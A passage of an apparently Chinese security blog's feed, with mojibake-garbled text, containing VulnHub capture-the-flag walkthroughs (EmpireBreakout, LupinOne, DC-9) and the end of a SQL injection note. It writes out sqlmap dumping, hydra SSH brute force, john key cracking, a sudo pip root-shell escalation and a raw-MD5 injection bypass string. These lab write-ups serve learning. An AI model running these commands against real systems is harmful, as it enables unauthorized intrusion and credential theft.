class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">content: 129581926211651571912466741651878684928</span><br><span class="line">hex: 06da5430449f8f6f23dfc1276f722738</span><br><span class="line">raw: \x06\xdaT0D\x9f\x8fo<span class="comment">#\xdf\xc1&#x27;or&#x27;8</span></span><br><span class="line">string: T0Do<span class="comment">#&#x27;or&#x27;8</span></span><br></pre></td></tr></table></figure><p>è½¬è½½è‡³  <a href="https://xz.aliyun.com/t/10594#toc-3">https://xz.aliyun.com/t/10594#toc-3</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;SQLæ³¨å…¥æ¼æ´&quot;&gt;&lt;a href=&quot;#SQLæ³¨å…¥æ¼æ´&quot; class=&quot;headerlink&quot; title=&quot;SQLæ³¨å…¥æ¼æ´&quot;&gt;&lt;/a&gt;SQLæ³¨å…¥æ¼æ´&lt;/h1&gt;&lt;h2 id=&quot;èƒŒæ™¯&quot;&gt;&lt;a href=&quot;#èƒŒæ™¯&quot; class=&quot;headerlink&quot; title=&quot;èƒŒæ™¯&quot;&gt;&lt;/a&gt;èƒŒæ™¯&lt;/h2&gt;&lt;p&gt;éšç€äº’è”ç½‘webå’Œä¿¡æ¯æŠ€æœ¯çš„å‘å±•ï¼Œåœ¨webåç«¯ä½œä¸ºå­˜å‚¨å’Œç®¡ç†çš„çš„æ•°æ®åº“ä¹Ÿå¾—åˆ°äº†å¹¿æ³›çš„åº”ç”¨ï¼Œä¸webç»“åˆè¾ƒä¸ºç´§å¯†çš„æ•°æ®åº“åŒ…æ‹¬Mysqlï¼ŒSqlserverï¼ŒOracleï¼ŒSqlliteï¼ŒDb2ï¼ŒAccessç­‰ç­‰ã€‚ æ•°æ®å­˜å‚¨å’Œç®¡ç†ä½œä¸ºåº”ç”¨çš„ä¸€ä¸ªåŸºæœ¬éœ€æ±‚ï¼Œåœ¨ç»å¤§å¤šæ•°çš„åº”ç”¨é‡Œéƒ½å¾—åˆ°äº†ä½¿ç”¨ï¼Œè¿™ç§å¤§é¢ç§¯çš„ä½¿ç”¨ä¹Ÿæ„å‘³ç€åœ¨æ•°æ®åº“æ“ä½œæ–¹é¢å¦‚æœå¤„ç†ä¸å½“å‡ºç°é—®é¢˜çš„å¯èƒ½æ€§ä¼šå¾ˆå¤§ï¼Œå¦å¤–ä¸€æ–¹é¢ç”±äºæ•°æ®åº“æ‰¿è½½äº†åº”ç”¨çš„æ•°æ®ä¿¡æ¯ï¼Œå¦‚æœæ•°æ®åº“å‡ºç°é—®é¢˜ä¸€æ–¹é¢å¯èƒ½å¯¼è‡´æ•æ„Ÿæ•°æ®çš„æ³„éœ²å’Œç¯¡æ”¹ï¼ˆå¦‚ä¿¡ç”¨å¡è´¦æˆ·ï¼Œç”¨æˆ·å¯†ç ï¼Œç®¡ç†è´¦æˆ·å’Œå¯†ç ï¼Œé”€å”®è®°å½•ç­‰ç­‰ï¼‰ï¼Œç›´æ¥å¯¼è‡´æŸå¤±å’Œåº”ç”¨è¢«æ”»é™·ï¼Œå¦å¤–ä¸€æ–¹é¢ï¼Œå³ä½¿æ•°æ®åº“ä¸­ä¸æ‰¿è½½è¾ƒä¸ºæ•æ„Ÿçš„ä¿¡æ¯ï¼Œç”±äºæ•°æ®åº“çš„ç‰¹æ®Šæ€§ï¼Œæ•°æ®åº“è¢«æ”»å‡»çš„è¯ä¹Ÿå¯ä»¥ç›´æ¥å¯¼è‡´åº”ç”¨ç¨‹åºå´©æºƒåŠå…¶ä»–ä¸¥é‡çš„åæœã€‚&lt;/p&gt;
&lt;h2 id=&quot;æ¼æ´æˆå› &quot;&gt;&lt;a href=&quot;#æ¼æ´æˆå› &quot; class=&quot;headerlink&quot; title=&quot;æ¼æ´æˆå› &quot;&gt;&lt;/a&gt;æ¼æ´æˆå› &lt;/h2&gt;&lt;p&gt;åº”ç”¨ä¸ºäº†å’Œæ•°æ®åº“è¿›è¡Œæ²Ÿé€šå®Œæˆå¿…è¦çš„ç®¡ç†å’Œå­˜å‚¨å·¥ä½œï¼Œå¿…é¡»å’Œæ•°æ®åº“ä¿ç•™ä¸€ç§æ¥å£ã€‚ç›®å‰çš„æ•°æ®åº“ä¸€èˆ¬éƒ½æ˜¯æä¾›apiä»¥æ”¯æŒç®¡ç†ï¼Œåº”ç”¨ä½¿ç”¨åº•å±‚å¼€å‘è¯­è¨€å¦‚Phpï¼ŒJavaï¼Œaspï¼ŒPythonä¸è¿™äº›apiè¿›è¡Œé€šè®¯ã€‚å¯¹äºæ•°æ®åº“çš„æ“ä½œï¼Œç›®å‰æ™®éä½¿ç”¨ä¸€ç§SQLè¯­è¨€ï¼ˆStructured Query Languageè¯­è¨€ï¼ŒSQLè¯­è¨€çš„åŠŸèƒ½åŒ…æ‹¬å¢åˆ æŸ¥æ”¹ç­‰ï¼Œæ˜¯ä¸€ä¸ªç»¼åˆçš„ã€é€šç”¨çš„å…³ç³»æ•°æ®åº“è¯­è¨€ï¼ŒåŒæ—¶åˆæ˜¯ä¸€ç§é«˜åº¦éè¿‡ç¨‹åŒ–çš„è¯­è¨€ï¼Œåªè¦æ±‚ç”¨æˆ·æŒ‡å‡ºåšä»€ä¹ˆè€Œä¸éœ€è¦æŒ‡å‡ºæ€ä¹ˆåšï¼‰ï¼ŒSQLä½œä¸ºå­—ç¬¦ä¸²é€šè¿‡APIä¼ å…¥ç»™æ•°æ®åº“ï¼Œæ•°æ®åº“å°†æŸ¥è¯¢çš„ç»“æœè¿”å›ï¼Œæ•°æ®åº“è‡ªèº«æ˜¯æ— æ³•åˆ†è¾¨ä¼ å…¥çš„SQLæ˜¯åˆæ³•çš„è¿˜æ˜¯ä¸åˆæ³•çš„ï¼Œå®ƒå®Œå…¨ä¿¡ä»»ä¼ å…¥çš„æ•°æ®ï¼Œå¦‚æœä¼ å…¥çš„SQLè¯­å¥è¢«æ¶æ„ç”¨æˆ·æ§åˆ¶æˆ–è€…ç¯¡æ”¹ï¼Œå°†å¯¼è‡´æ•°æ®åº“ä»¥å½“å‰è°ƒç”¨è€…çš„èº«ä»½æ‰§è¡Œé¢„æœŸä¹‹å¤–çš„å‘½ä»¤å¹¶ä¸”è¿”å›ç»“æœï¼Œå¯¼è‡´å®‰å…¨é—®é¢˜ã€‚ é‚£ä¹ˆæ¶æ„ç”¨æˆ·å¦‚ä½•æ‰èƒ½æ§åˆ¶ä¼ å…¥çš„SQLè¯­å¥å‘¢ï¼Ÿæˆ‘ä»¬çŸ¥é“ï¼Œæ—¢ç„¶ä¼ å…¥çš„SQLæ˜¯ä»¥å­—ç¬¦ä¸²çš„æ–¹å¼ä¼ å…¥çš„ï¼Œè¿™ä¸ªå­—ç¬¦ä¸²ç”±åº”ç”¨ç”Ÿæˆï¼Œé‚£ä¹ˆå¦‚æœåº”ç”¨ç”Ÿæˆè¿™ä¸ªå­—ç¬¦ä¸²çš„æ–¹å¼ä¸å¯¹å°±å¯èƒ½å¯¼è‡´é—®é¢˜ï¼Œè­¬å¦‚è€ƒè™‘å¦‚ä¸‹çš„åŠŸèƒ½ï¼š&lt;/p&gt;</summary>
    
    
    
    <category term="ç¬”è®°" scheme="https://syst1m.top/categories/%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="sqlæ³¨å…¥" scheme="https://syst1m.top/tags/sql%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>vulnhub-EmpireBreakout</title>
    <link href="https://syst1m.top/2022/06/22/vulnhub-breakout%E6%89%93%E9%9D%B6/"/>
    <id>https://syst1m.top/2022/06/22/vulnhub-breakout%E6%89%93%E9%9D%B6/</id>
    <published>2022-06-22T07:40:10.000Z</published>
    <updated>2022-06-22T08:53:22.425Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ç¯å¢ƒ"><a href="#ç¯å¢ƒ" class="headerlink" title="ç¯å¢ƒ"></a>ç¯å¢ƒ</h1><p>vulnhubé¡¹ç›®  <a href="https://www.vulnhub.com/entry/empire-breakout,751/">https://www.vulnhub.com/entry/empire-breakout,751/</a><br>é¶æœº:172.16.17.152<br>æ”»å‡»æœºkali:172.16.17.140</p><h1 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h1><p>ä½¿ç”¨nmapå¯¹é¶æœºè¿›è¡Œæ‰«æ å¼€å¯äº†ä¸‰ä¸ªwebæœåŠ¡,å’Œ2ä¸ªsmbæœåŠ¡<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206221547410.png"></p><p>445é«˜å±ç«¯å£,å°è¯•expæ‰“445ç«¯å£,å¤±è´¥,ç»§ç»­å¾€ä¸‹çœ‹80ç«¯å£<br>apache,åœ¨å‰ç«¯æºç é‡Œæ‰¾åˆ°æç¤ºå’ŒåŠ å¯†å¯†æ–‡<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206221606870.png"></p><p>æŒ¨ä¸ªå°è¯•è§£å¯†,æœ€åä¸ºBrainfuckåŠ å¯†,è§£å‡ºæ˜æ–‡ä¸º .2uqPEfj3D&lt;Pâ€™a-3 åº”è¯¥æ˜¯æŸä¸ªè´¦å·çš„å¯†ç <br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206221609231.png"></p><p>æŒ¨ä¸ªè®¿é—®10000&#x2F;20000ç«¯å£,éƒ½æ˜¯ç™»å½•é¡µé¢,æ²¡æœ‰åˆ©ç”¨çš„ç‚¹<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206221612140.png"></p><h2 id="smbå—…æ¢"><a href="#smbå—…æ¢" class="headerlink" title="smbå—…æ¢"></a>smbå—…æ¢</h2><p>æƒ³åˆ°smbæœåŠ¡è¿˜æ²¡æœ‰åˆ©ç”¨åˆ°,å›è¿‡å¤´ç»§ç»­çœ‹smbæœåŠ¡<br>enum4linux å¯¹é¶æœºè¿›è¡Œå—…æ¢,çˆ†å‡ºäº†ä¸€ä¸ªç”¨æˆ·å cyber</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">enum.exeçš„Linuxæ›¿ä»£è½¯ä»¶ï¼Œç”¨äºæšä¸¾Windowså’ŒSambaä¸»æœºä¸­çš„æ•°æ®ã€‚</span><br><span class="line">enum4linux 172.16.17.152</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206221615489.png"></p><h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><h2 id="ç™»å½•"><a href="#ç™»å½•" class="headerlink" title="ç™»å½•"></a>ç™»å½•</h2><p>ç™»å½•æˆåŠŸ,å‘ç°æœ‰ä¸ªåœ°æ–¹å¯ä»¥ç›´æ¥æ‰§è¡Œå‘½ä»¤<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206221619772.png"></p><p>åå¼¹shell<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206221622849.png"><br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206221622106.png"></p><h2 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h2><p>æŸ¥çœ‹rootæƒé™æ‰§è¡Œçš„å‘½ä»¤,å’Œæ–‡ä»¶,æ²¡æœ‰sudoå‘½ä»¤,æ²¡æœ‰åˆ©ç”¨çš„ç‚¹<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206221627684.png"></p><p>æ‹¿åˆ°ç¬¬ä¸€ä¸ªflagå’Œä¸€ä¸ªrootæƒé™çš„ tarå‘½ä»¤<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206221630268.png"></p><p>æ—¢ç„¶æœ‰tar,é‚£ä¹ˆå°±è¦ç”¨åˆ°å‹ç¼© è§£å‹å»ææƒ,æœ€ååœ¨&#x2F;var&#x2F;backupsä¸‹ç¿»åˆ°ä¸€ä¸ªå¯†ç å¤‡ä»½æ–‡ä»¶<br>å¯¹å¯†ç çš„å¤‡ä»½æ–‡ä»¶è¿›è¡Œå‹ç¼©ï¼Œç„¶åè§£å‹å³å¯ä¹ˆè®¿é—®æ‹¿åˆ°å¯†ç </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./tar -czvf test.tar.gz /var/backups/.old_pass.bak</span><br><span class="line">tar -xzvf test.tar.gz</span><br><span class="line"><span class="built_in">cat</span> var/backups/.old_pass.bak</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206221650882.png"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206221649498.png"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;ç¯å¢ƒ&quot;&gt;&lt;a href=&quot;#ç¯å¢ƒ&quot; class=&quot;headerlink&quot; title=&quot;ç¯å¢ƒ&quot;&gt;&lt;/a&gt;ç¯å¢ƒ&lt;/h1&gt;&lt;p&gt;vulnhubé¡¹ç›®  &lt;a href=&quot;https://www.vulnhub.com/entry/empire-breakout,751/&quot;&gt;https://www.vulnhub.com/entry/empire-breakout,751/&lt;/a&gt;&lt;br&gt;é¶æœº:172.16.17.152&lt;br&gt;æ”»å‡»æœºkali:172.16.17.140&lt;/p&gt;
&lt;h1 id=&quot;ä¿¡æ¯æ”¶é›†&quot;&gt;&lt;a href=&quot;#ä¿¡æ¯æ”¶é›†&quot; class=&quot;headerlink&quot; title=&quot;ä¿¡æ¯æ”¶é›†&quot;&gt;&lt;/a&gt;ä¿¡æ¯æ”¶é›†&lt;/h1&gt;&lt;p&gt;ä½¿ç”¨nmapå¯¹é¶æœºè¿›è¡Œæ‰«æ å¼€å¯äº†ä¸‰ä¸ªwebæœåŠ¡,å’Œ2ä¸ªsmbæœåŠ¡&lt;br&gt;&lt;img src=&quot;https://raw.githubusercontent.com/chencicici/images/main/202206221547410.png&quot;&gt;&lt;/p&gt;
&lt;p&gt;445é«˜å±ç«¯å£,å°è¯•expæ‰“445ç«¯å£,å¤±è´¥,ç»§ç»­å¾€ä¸‹çœ‹80ç«¯å£&lt;br&gt;apache,åœ¨å‰ç«¯æºç é‡Œæ‰¾åˆ°æç¤ºå’ŒåŠ å¯†å¯†æ–‡&lt;br&gt;&lt;img src=&quot;https://raw.githubusercontent.com/chencicici/images/main/202206221606870.png&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>vulnhub-EmpireLupinOneæ‰“é¶</title>
    <link href="https://syst1m.top/2022/06/21/vulnhub-Empire%E6%89%93%E9%9D%B6/"/>
    <id>https://syst1m.top/2022/06/21/vulnhub-Empire%E6%89%93%E9%9D%B6/</id>
    <published>2022-06-21T10:10:30.000Z</published>
    <updated>2022-06-22T07:50:01.542Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ç¯å¢ƒ"><a href="#ç¯å¢ƒ" class="headerlink" title="ç¯å¢ƒ"></a>ç¯å¢ƒ</h1><p>vulnhubé¡¹ç›® <a href="https://www.vulnhub.com/series/empire,507/">https://www.vulnhub.com/series/empire,507/</a><br>é¶æœº:172.16.17.151<br>æ”»å‡»æœºkali:172.16.17.140</p><h1 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h1><p>nmapæ‰«æç¡®å®šé¶æœºip,å†è¯¦ç»†æ‰«æ<br>å¼€æ”¾äº†22å’Œ80,æ‰«å‡ºä¸€ä¸ª&#x2F;~myfilesç›®å½•<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206211837023.png"></p><p>è®¿é—®çœ‹çœ‹,æç¤º404,æš—ç¤ºæˆ‘ä»¬ç»§ç»­å°è¯•å½“å‰ç›®å½•<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206211838965.png"></p><h2 id="fuzz"><a href="#fuzz" class="headerlink" title="fuzz"></a>fuzz</h2><p>wfuzzç»§ç»­æ‰«å½“å‰ç›®å½•</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -c -w /usr/share/wfuzz/wordlist/general/common.txt --hc 404 http://172.16.17.151/~FUZZ</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206211859278.png"></p><p>æç¤ºæˆ‘ä»¬icex64ç”¨æˆ·æœ‰sshç§˜é’¥,å¹¶ä½¿ç”¨fasttrackå»çˆ†ç ´<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206211901501.png"></p><p>ç»§ç»­çˆ†ç ´,æ‰«å‡ºä¸€ä¸ªæ–‡ä»¶</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hc 404,403 -u http://172.16.17.151/~secret/.FUZZ.txt</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206211916638.png"></p><p>ä½†æ˜¯åº”è¯¥æ˜¯åŠ å¯†è¿‡çš„,ä¸æ˜¯sshå¯†é’¥<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206211917480.png"></p><p>æ‹¿å»è§£å¯†,æŒ¨ä¸ªå°è¯•å,ä»¥base58è§£å‡ºç§˜é’¥<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206211922436.png"></p><h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><h2 id="çˆ†ç ´ç§˜é’¥"><a href="#çˆ†ç ´ç§˜é’¥" class="headerlink" title="çˆ†ç ´ç§˜é’¥"></a>çˆ†ç ´ç§˜é’¥</h2><p>ä½¿ç”¨ssh2johnå°†ç§˜é’¥ç¼–è¯‘ä¸€ä¸‹,å†ä½¿ç”¨johnæš´åŠ›ç ´è§£,è§£å‡ºå¯†ç  P@55w0rd!</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssh2john key.txt &gt; passkey.txt</span><br><span class="line">                                                                                                                                                                                                              </span><br><span class="line">john --wordlist=/usr/share/wordlists/fasttrack.txt passkey.txt</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206211929056.png"></p><h2 id="å°è¯•ç™»å½•"><a href="#å°è¯•ç™»å½•" class="headerlink" title="å°è¯•ç™»å½•"></a>å°è¯•ç™»å½•</h2><p>ç›´æ¥ç™»å½•è¢«æ‹’ç»<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206211932835.png"></p><p>åˆ©ç”¨ç§˜é’¥å†æ¬¡ç™»å½•,æ­¤å¤„è¦æ³¨æ„,å…ˆå°†ç§˜é’¥æƒé™æ”¹ä¸º 600<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206211938634.png"></p><h2 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h2><p>åœ¨å®¶ç›®å½•ä¸‹çœ‹åˆ°ä¸€ä¸ªuser.txt,æ‹¿åˆ°ç¬¬ä¸€ä¸ªflag<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206211946639.png"></p><p>æŸ¥çœ‹rootæƒé™è¿è¡Œçš„æ–‡ä»¶,æ²¡æœ‰å†™å…¥æƒé™,ç»§ç»­å¾€ä¸‹çœ‹<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206211941860.png"></p><p>å‘ç°ä½¿ç”¨webbrowseråŒ…,è·Ÿè¿›çœ‹çœ‹<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206211952250.png"></p><p>æ˜¯rootæƒé™<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206211953957.png"></p><p>å†™å…¥shell<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206212014187.png"></p><p>è¿è¡Œheist.pyåå¼¹shell<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206212015303.png"></p><p>æŸ¥çœ‹arseneç”¨æˆ·ä¸‹ä»¥rootæƒé™è¿è¡Œçš„å‘½ä»¤æˆ–æ–‡ä»¶,å‘ç°pipä¸éœ€è¦å¯†ç å°±å¯ä»¥æ‰§è¡Œ<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206212016681.png"></p><p>google pipææƒ æ‰¾åˆ°æ–¹æ³•</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">arsene@LupinOne:~$ TF=$(<span class="built_in">mktemp</span> -d)</span><br><span class="line">arsene@LupinOne:~$ <span class="built_in">echo</span> <span class="string">&quot;import os; os.execl(&#x27;/bin/sh&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;, &#x27;sh &lt;<span class="subst">$(tty)</span> &gt;<span class="subst">$(tty)</span> 2&gt;<span class="subst">$(tty)</span>&#x27;)&quot;</span> &gt; <span class="variable">$TF</span>/setup.py</span><br><span class="line">arsene@LupinOne:~$ sudo pip install <span class="variable">$TF</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206212029257.png"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;ç¯å¢ƒ&quot;&gt;&lt;a href=&quot;#ç¯å¢ƒ&quot; class=&quot;headerlink&quot; title=&quot;ç¯å¢ƒ&quot;&gt;&lt;/a&gt;ç¯å¢ƒ&lt;/h1&gt;&lt;p&gt;vulnhubé¡¹ç›® &lt;a href=&quot;https://www.vulnhub.com/series/empire,507/&quot;&gt;https://www.vulnhub.com/series/empire,507/&lt;/a&gt;&lt;br&gt;é¶æœº:172.16.17.151&lt;br&gt;æ”»å‡»æœºkali:172.16.17.140&lt;/p&gt;
&lt;h1 id=&quot;ä¿¡æ¯æ”¶é›†&quot;&gt;&lt;a href=&quot;#ä¿¡æ¯æ”¶é›†&quot; class=&quot;headerlink&quot; title=&quot;ä¿¡æ¯æ”¶é›†&quot;&gt;&lt;/a&gt;ä¿¡æ¯æ”¶é›†&lt;/h1&gt;&lt;p&gt;nmapæ‰«æç¡®å®šé¶æœºip,å†è¯¦ç»†æ‰«æ&lt;br&gt;å¼€æ”¾äº†22å’Œ80,æ‰«å‡ºä¸€ä¸ª&amp;#x2F;~myfilesç›®å½•&lt;br&gt;&lt;img src=&quot;https://raw.githubusercontent.com/chencicici/images/main/202206211837023.png&quot;&gt;&lt;/p&gt;
&lt;p&gt;è®¿é—®çœ‹çœ‹,æç¤º404,æš—ç¤ºæˆ‘ä»¬ç»§ç»­å°è¯•å½“å‰ç›®å½•&lt;br&gt;&lt;img src=&quot;https://raw.githubusercontent.com/chencicici/images/main/202206211838965.png&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="æ‰“é¶" scheme="https://syst1m.top/categories/%E6%89%93%E9%9D%B6/"/>
    
    
    <category term="vulnhub" scheme="https://syst1m.top/tags/vulnhub/"/>
    
    <category term="ssh" scheme="https://syst1m.top/tags/ssh/"/>
    
  </entry>
  
  <entry>
    <title>vulnhub-dc9æ‰“é¶</title>
    <link href="https://syst1m.top/2022/06/18/vulnhub-dc9%E6%89%93%E9%9D%B6/"/>
    <id>https://syst1m.top/2022/06/18/vulnhub-dc9%E6%89%93%E9%9D%B6/</id>
    <published>2022-06-18T10:43:50.000Z</published>
    <updated>2022-06-21T10:10:08.807Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ç¯å¢ƒ"><a href="#ç¯å¢ƒ" class="headerlink" title="ç¯å¢ƒ"></a>ç¯å¢ƒ</h1><p>vulnhubé¡¹ç›® <a href="https://www.vulnhub.com/entry/dc-9,412/">https://www.vulnhub.com/entry/dc-9,412/</a><br>é¶æœº:172.16.17.150<br>æ”»å‡»æœºkali:172.16.17.140</p><h1 id="æè¿°"><a href="#æè¿°" class="headerlink" title="æè¿°"></a>æè¿°</h1><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206181846501.png"></p><h1 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h1><p>nmapæ‰«æé¶æœº,å­˜åœ¨22ç«¯å£,ä½†æ˜¯çŠ¶æ€ä¸ºfiltered,æ€€ç–‘è¢«knockdä¿æŠ¤<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206181847274.png"></p><p>æ‰«ç›®å½•<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206181900356.png"></p><p>webæŒ‡çº¹<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206181848261.png"></p><p>æŒ¨ä¸ªè®¿é—®æ‰«å‡ºæ¥çš„ç›®å½•,åœ¨è®¿é—®session.phpçš„æ—¶å€™å‘ç°å·²ç»ç™»å½•,åœ¨ä¸‹é¢æç¤ºæ–‡ä»¶ä¸å­˜åœ¨,å¯èƒ½å­˜åœ¨æ–‡ä»¶åŒ…å«æ¼æ´<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206181903758.png"></p><p>çŒœä¸€ä¸‹æ¥å—å‚æ•°çš„å˜é‡å,æˆåŠŸè¯»å–<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206181915830.png"></p><p>ä¸Šé¢æ€€ç–‘sshè¢«ä¿æŠ¤,ç°åœ¨ç”¨æ–‡ä»¶åŒ…å«è¯»å–ä¸€ä¸‹<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206181919654.png"></p><h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><h2 id="sqlæ³¨å…¥"><a href="#sqlæ³¨å…¥" class="headerlink" title="sqlæ³¨å…¥"></a>sqlæ³¨å…¥</h2><p>æ–‡ä»¶åŒ…å«æ²¡æœ‰èƒ½ç»§ç»­åˆ©ç”¨çš„ç”µ,æŸ¥çœ‹å…¶ä»–åŠŸèƒ½ç‚¹,å‘ç°ä¸€å¤„æœç´¢æ¡†,postä¼ è¾“æ•°æ®,æœ‰æœç´¢å°±æœ‰æ•°æ®åº“äº¤äº’,æŠ“åŒ…fuzz<br>å½“è¯­å¥ä¸ºâ€™or 1&#x3D;1 #æ—¶,äº§ç”Ÿæ³¨å…¥,ä¸¢åˆ°sqlmapè·‘<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206181944447.png"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206181947908.png"></p><p>è·‘å‡ºè´¦å·å¯†ç </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r 1.txt -batch -D <span class="built_in">users</span> -T <span class="string">&#x27;UserDetails&#x27;</span> -C <span class="string">&#x27;password,username&#x27;</span> --dump</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206181952744.png"></p><h2 id="knockç¢°æ’ssh"><a href="#knockç¢°æ’ssh" class="headerlink" title="knockç¢°æ’ssh"></a>knockç¢°æ’ssh</h2><p>å®‰è£…knockd<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206181930687.png"></p><p>æ ¹æ®åˆšåˆšè¯»åˆ°çš„ç«¯å£,å»æ•²é—¨,é€†åºç«¯å£å·,å‘ç°sshå·²ç»å¯¹æˆ‘ä»¬å¼€æ”¾<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206181937749.png"></p><h2 id="æ’åº“"><a href="#æ’åº“" class="headerlink" title="æ’åº“"></a>æ’åº“</h2><p>åˆ©ç”¨è·‘å‡ºæ¥çš„è´¦å·å¯†ç ,æ‹¿å»æ’ssh,è·‘å‡ºä¸‰ä¸ªè´¦å·</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -L user.txt -P passwords.txt 172.16.17.150 ssh</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206181959848.png"></p><p>ç›¸ç»§è¿›å…¥å‡ ä¸ªè´¦å·,ç¿»ç¿»ç¿»*10,æœ€ååœ¨janitoræ‰¾åˆ°ä¸€ä¸ªå¯†ç æ–‡ä»¶<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206182008193.png"></p><p>å¤åˆ¶è¿›passwdæ–‡ä»¶ç»§ç»­çˆ†ç ´,çˆ†å‡ºä¸€ä¸ªæ–°çš„è´¦å·<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206182010559.png"></p><h2 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h2><p>ç™»å½•çœ‹çœ‹ä»¥rootæƒé™è¿è¡Œçš„æ–‡ä»¶<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206182014091.png"></p><p>findæŸ¥æ‰¾è·¯å¾„</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name test.py -<span class="built_in">print</span> 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206182016074.png"></p><p>åˆ†æç¬¬ä¸€ä¸ªtest.pyæ–‡ä»¶,è¯»å–ç¬¬ä¸€ä¸ªæ–‡ä»¶çš„å†…å®¹,æ·»åŠ åˆ°ç¬¬äºŒä¸ªæ–‡ä»¶çš„æœ«å°¾<br><img 